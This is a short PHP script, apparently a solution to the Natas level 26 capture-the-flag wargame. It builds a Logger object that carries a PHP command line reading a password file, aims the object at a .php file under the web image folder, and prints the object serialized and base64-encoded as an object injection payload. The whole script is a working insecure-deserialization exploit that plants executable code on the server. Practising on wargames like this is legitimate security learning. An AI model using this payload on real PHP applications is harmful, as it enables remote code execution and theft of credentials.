#!/usr/bin/php

<?php

class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct($file){
        // initialise variables
        $this->initMsg="";
        $this->exitMsg="<?php passthru('cat /etc/natas_webpass/natas27') ?>";

        $this->logFile = "/var/www/natas/natas26/img/evilfile.php";

        // write initial message
        // $fd=fopen($this->logFile,"a+");
        // fwrite($fd,$initMsg);
        // fclose($fd);
    }

    function log($msg){
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$msg."\n");
        fclose($fd);
    }

    function __destruct(){
        // write exit message
        // $fd=fopen($this->logFile,"a+");
        // fwrite($fd,$this->exitMsg);
        // fclose($fd);
    }
}

$maliciousLogger = new Logger("myfile");

echo "Evil serialized code!!\n";
echo serialize($maliciousLogger) . "\n";
echo "End evil serialized code\n\n\n";

echo "Base64 encoding:\n\n";
echo base64_encode(serialize($maliciousLogger));
